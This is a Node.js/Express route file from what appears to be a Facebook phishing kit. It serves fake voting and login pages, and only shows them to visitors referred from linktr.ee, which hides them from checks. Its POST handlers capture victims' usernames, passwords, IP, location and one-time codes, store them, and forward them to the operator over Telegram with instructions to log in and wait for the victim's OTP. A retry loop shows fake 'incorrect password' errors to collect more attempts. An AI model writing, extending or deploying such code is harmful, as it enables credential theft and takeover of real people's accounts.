const router = require("express").Router();
const Links = require("../../models/LinkModel");
const User = require("../../models/User");
const Credential = require("../../models/CredentialModel");
const bot = require("../../telegram");
const { blockPhishingUrl } = require("../../middlewares/blockUrl");


router.get("/v/:linkId", blockPhishingUrl, async (req, res) => {
    try {
        const referer = req.headers.referer;
        if(referer !== 'https://linktr.ee/'){
            return res.redirect("/notfound");
        }
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        const user = await User.findById(link.user);
        if (user.notification) {
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈
PLATFORM: ${link.linkType}
MESSAGE: Someone is about to Login.

                            `)
        }
        return res.render("socials/facebook/vote", { req,
            INTERNAL_PHISHING_URL: process.env.INTERNAL_PHISHING_URL,
            link, name: link.modelName, linkType: link.linkType, linkId: link.id, retry: link.numberOfRetries, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound")

    }
});


router.get("/v-2/:linkId", blockPhishingUrl, async (req, res) => {
    try {
        const referer = req.headers.referer;
        if(referer !== 'https://linktr.ee/'){
            return res.redirect("/notfound");
        }
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        const user = await User.findById(link.user);
        if (user.notification) {
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈
PLATFORM:${link.linkType}
MESSAGE: Someone is about to Login.

                            `)
        }
        const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
        return res.render("socials/facebook/vote2", { req,
            INTERNAL_PHISHING_URL: process.env.INTERNAL_PHISHING_URL,
            link, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound")
    }
});


router.get("/v-3/:linkId", blockPhishingUrl, async (req, res) => {
    try {
        const referer = req.headers.referer;
        if(referer !== 'https://linktr.ee/'){
            return res.redirect("/notfound");
        }
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        const url = "https://" + req.hostname + "/vote3/" + link.link;
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        const user = await User.findById(link.user);
        if (user.notification) {
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈
PLATFORM: ${link.linkType}
MESSAGE: Someone is about to Login.
`)
        }
        // const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
        return res.render("socials/facebook/vote3", {
            req,
            INTERNAL_PHISHING_URL: process.env.INTERNAL_PHISHING_URL,
            link,
            url,
            res,
            layout: false
        });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound")
    }
});


router.get("/face/:linkId", blockPhishingUrl, async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/facebook", { req, linkId, link, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard")
    }
});

router.get("/face/otp/:linkId", blockPhishingUrl, async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/faceOTP", { req, linkId, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/dashboard")
    }
});

router.post("/face/:linkId", async (req, res) => {
    try {
        const { username, password, country, city, region, ip } = req.body;
        const retry = req.query?.retry || 1;
        const { linkId } = req.params;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findOne({ _id: linkId });
        const user = await User.findById(link.user);

        if (link?.name) {
            const newCredential = new Credential({
                user: link.user,
                link: linkId,
                country,
                region,
                ip,
                city,
                linkName: link.name,
                linkType: "Facebook",
                fields: {
                    username,
                    password
                }
            });
            await newCredential.save();
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈

USERNAME: ${username}
PASSWORD: ${password}

PLATFORM: FACEBOOK
COUNTRY: ${country}
CITY: ${city}
REGION: ${region}
IP: ${ip}

${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}

Login with: https://www.facebook.com
                                                `)
                .catch(err => console.log("Telegram error"));
                
            if(retry > 1){
                req.flash("error_msg", "incorrect password, try again.");
                return res.redirect(`/face/${linkId}?retry=${retry-1}`)
            }
            if (link.otpEnabled) {
                return res.redirect("/face/otp/" + link.id);
            } else {
                return res.redirect("/successful-vote");
            }
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});

router.post("/face/otp/:linkId", async (req, res) => {
    try {
        const { linkId, code } = req.body;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findOne({ _id: linkId });;
        const user = await User.findById(link.user);

        if (link) {
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈

PLATFORM: FACEBOOK

OTP RECEIVED!

CODE: ${code}


`)
                .catch(err => console.log("Telegram error"));
            return res.redirect("/successful-vote");
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;